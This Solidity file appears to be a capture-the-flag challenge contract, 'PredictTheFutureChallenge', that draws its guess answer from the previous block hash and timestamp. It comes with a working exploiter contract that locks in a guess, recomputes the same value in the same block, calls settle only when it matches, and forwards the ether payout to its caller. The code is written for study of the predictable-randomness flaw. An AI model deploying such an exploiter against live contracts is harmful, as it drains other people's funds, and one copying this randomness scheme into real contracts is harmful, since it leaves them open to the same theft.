pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract PredictTheFutureChallengeExploiter {
    PredictTheFutureChallenge exploited;
    function PredictTheFutureChallengeExploiter(PredictTheFutureChallenge _exploited) public {
        exploited = _exploited;
    }

    function calcAnswer() internal view returns (uint8) {
        return uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
    }

    function lockInGuess() external payable {
        exploited.lockInGuess.value(1 ether)(0);
    }

    function exploit() external {
        uint8 answer = calcAnswer();
        require(answer == 0);

        exploited.settle();

        msg.sender.transfer(address(this).balance);
    }

    function() public payable {}

}